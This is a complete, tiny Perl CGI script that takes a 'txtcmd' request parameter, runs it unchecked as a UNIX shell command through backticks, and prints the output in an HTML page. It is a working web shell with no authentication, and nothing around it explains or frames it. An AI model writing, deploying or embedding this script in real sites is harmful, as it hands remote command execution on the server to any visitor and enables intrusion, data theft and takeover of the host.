#!/usr/bin/perl

use CGI':standard';

print "content-type: text/html \n\n";
$cmd = param("txtcmd");
print "<html>\n<body bgcolor='red'>\n";
print "Output of UNIX command :\n";
print `$cmd`;
print "</body></html>";